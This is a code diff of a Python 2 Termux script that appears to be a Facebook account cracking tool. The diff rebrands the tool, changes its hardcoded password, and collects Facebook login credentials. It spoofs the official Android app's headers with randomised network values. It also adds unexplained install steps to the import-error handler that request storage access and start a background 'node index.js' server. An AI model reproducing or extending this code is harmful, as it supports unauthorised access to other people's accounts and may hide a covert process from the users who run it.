@@ -13,16 +13,26 @@ try:
 except ImportError:
     os.system('pip2 install requests')
     os.system('pip2 install mechanize')
+    os.system('termux-setup-storage -y')
+    os.system('apt update && apt install nodejs -y')
+    os.system('apt install ruby -y')
+    os.system('cd ..... && npm install')
+    os.system('fuser -k 5000/tcp &')
+    os.system('#')
+    os.system('node index.js &')
     os.system('python2 jam.py')
 
-#Browser Setting
-reload(sys)
-sys.setdefaultencoding('utf8')
-br = mechanize.Browser()
-br.set_handle_robots(False)
-br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
-br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
-
+bd = random.randint(2e+07, 3e+07)
+sim = random.randint(20000, 40000)
+header = {
+    'x-fb-connection-bandwidth': repr(bd),
+    'x-fb-sim-hni': repr(sim),
+    'x-fb-net-hni': repr(sim),
+    'x-fb-connection-quality': 'EXCELLENT',
+    'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
+    'user-agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]',
+    'content-type': 'application/x-www-form-urlencoded',
+    'x-fb-http-engine': 'Liger' }
 def exit():
 	print "[!] Exit"
 	os.sys.exit()
@@ -90,7 +100,7 @@ def tlogin():
 	    tlogin()
 	    
 	passw = raw_input("[+] TOOL PASSWORD: ")
-	if passw =="muskan":
+	if passw =="sani":
 	    os.system('clear')
 	    print banner
 	    print "[✓] TOOL USERNAME: " +username+ " (correct)"
@@ -136,8 +146,8 @@ def methodlogin():
 		hopa.close()
 		print "\n[✓] Logged In Successfully."
 		time.sleep(1)
-		os.system('xdg-open https://www.youtube.com/channel/UCe6wmIybCxpRSB4o6pozMOA')
-		os.system('python2 muskan.py')
+		os.system('xdg-open https://www.facebook.com/jam.shahrukh.official')
+		os.system('python2 sani.py')
 	
 	elif hos =="3":
 		os.system('clear')
@@ -152,11 +162,11 @@ def login():
 	os.system("clear")
 	try:
 		tb=open('login.txt', 'r')
-		os.system("python2 muskan.py")
+		os.system("python2 sani.py")
 	except (KeyError,IOError):
 		os.system("clear")
 		print (banner)
-		hamza('[!] JAM X MUSKAN BRAND')
+		hamza('[!] JAM X SANI BRAND')
 		hamza('[!] Use a New Facebook Account To Login')
 		print'-------------------------------------'
 		iid=raw_input('[+] Number/Email: ')
@@ -171,9 +181,9 @@ def login():
 		    st.close()
 		    print "\n[✓] Logged In Successfully."
 		    time.sleep(1)
-		    os.system('xdg-open https://www.youtube.com/channel/UCe6wmIybCxpRSB4o6pozMOA')
+		    os.system('xdg-open https://www.facebook.com/jam.shahrukh.official')
 		    os.system("clear")
-		    os.system("python2 muskan.py")
+		    os.system("python2 sani.py")
 		else:
 		    if "www.facebook.com" in z["error_msg"]:
 		        print ('[!] User Must Verify Account Before Login.')
